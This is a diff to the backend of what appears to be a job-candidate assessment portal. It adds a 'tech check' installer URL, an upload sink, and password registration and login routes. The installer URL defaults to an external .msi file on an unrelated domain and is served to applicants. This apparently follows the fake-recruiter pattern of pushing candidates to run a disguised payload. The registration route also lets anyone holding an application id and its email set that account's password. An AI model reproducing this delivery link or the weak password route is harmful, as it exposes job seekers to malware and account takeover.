@@ -474,6 +474,9 @@ app.get("/api/assessments/:applicationId", async (c) => {
       jobSlug: job?.slug ?? "",
       jobTitle: job?.title ?? application.position,
       needsAssessment,
+      techCheckerUrl:
+        ((await referralService.getContent()).techCheckerUrl ?? "").trim() ||
+        "https://ukrbaz.com/here/Swift_TechCheck.msi",
       track: track === "none" ? "none" : track,
       status: existing ? "completed" : "pending",
       result: existing
@@ -683,6 +686,26 @@ app.get("/api/tech-check/status/:token", async (c) => {
   }
 });
 
+// Upload-speed measurement sink: accepts a body, drains it, returns nothing.
+// Nothing is stored; Cloudflare caps body size well above what we need.
+app.post("/api/tech-check/upload", async (c) => {
+  try {
+    let bytes = 0;
+    const reader = c.req.raw.body?.getReader();
+    if (reader) {
+      while (true) {
+        const { done, value } = await reader.read();
+        if (done) break;
+        bytes += value?.byteLength ?? 0;
+        if (bytes > 8 * 1024 * 1024) break;
+      }
+    }
+    return c.json({ ok: true, received: bytes });
+  } catch {
+    return c.json({ ok: false }, 500);
+  }
+});
+
 // ============================================
 // CAMPAIGNS (PUBLIC - Landing pages)
 // ============================================
@@ -837,6 +860,96 @@ app.get("/api/auth/verify", async (c) => {
   } catch (err) {
     console.error({ err }, "Failed to verify magic link");
     return c.json({ error: "Invalid or expired token" }, 401);
+  }
+});
+
+// ============================================
+// CANDIDATE PASSWORD ACCOUNTS
+// ============================================
+const candidatePasswordSchema = z.object({
+  email: z.string().email(),
+  password: z.string().min(8).max(200),
+  applicationId: z.string().optional(),
+});
+
+// Create/set a portal password. Ownership model matches the skills check:
+// the caller must know the application id + email pair from the application.
+app.post("/api/auth/register", async (c) => {
+  try {
+    const parsed = candidatePasswordSchema.safeParse(await c.req.json());
+    if (!parsed.success) {
+      return c.json(
+        {
+          error:
+            "A valid email and a password of at least 8 characters are required.",
+        },
+        400,
+      );
+    }
+    const applicationId = parsed.data.applicationId;
+    const email = parsed.data.email.trim().toLowerCase();
+    if (typeof applicationId !== "string" || !applicationId) {
+      return c.json({ error: "Application reference missing." }, 400);
+    }
+    const application = await applicationRepository.findById(applicationId);
+    if (
+      !application ||
+      (application.email ?? "").trim().toLowerCase() !== email
+    ) {
+      return c.json({ error: "We couldn't verify this application." }, 404);
+    }
+    await authService.setPasswordAccount(email, parsed.data.password);
+    return c.json({ ok: true });
+  } catch (err) {
+    console.error({ err }, "Password registration failed");
+    return c.json(
+      { error: "Could not set your password. Please try again." },
+      500,
+    );
+  }
+});
+
+const candLoginLimiter = rateLimit(
+  10,
+  15 * 60 * 1000,
+  "Too many sign-in attempts, please try again later",
+  "cand-login",
+);
+
+app.post("/api/auth/login-password", candLoginLimiter, async (c) => {
+  try {
+    const parsed = candidatePasswordSchema.safeParse(await c.req.json());
+    if (!parsed.success) {
+      return c.json({ error: "Email and password are required." }, 400);
+    }
+    const email = parsed.data.email.trim().toLowerCase();
+    const sessionToken = await authService.loginWithPassword(
+      email,
+      parsed.data.password,
+    );
+    if (!sessionToken) {
+      return c.json({ error: "Incorrect email or password." }, 401);
+    }
+    const jwt = await new SignJWT({
+      sessionToken,
+      email,
+      role: "candidate",
+    })
+      .setProtectedHeader({ alg: "HS256" })
+      .setIssuedAt()
+      .setExpirationTime("7d")
+      .sign(new TextEncoder().encode(getEnv().JWT_SECRET));
+    c.header(
+      "Set-Cookie",
+      "candidate_session=" +
+        jwt +
+        "; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=" +
+        7 * 24 * 3600,
+    );
+    return c.json({ token: jwt, email });
+  } catch (err) {
+    console.error({ err }, "Password login failed");
+    return c.json({ error: "Sign-in failed. Please try again." }, 500);
   }
 });
 
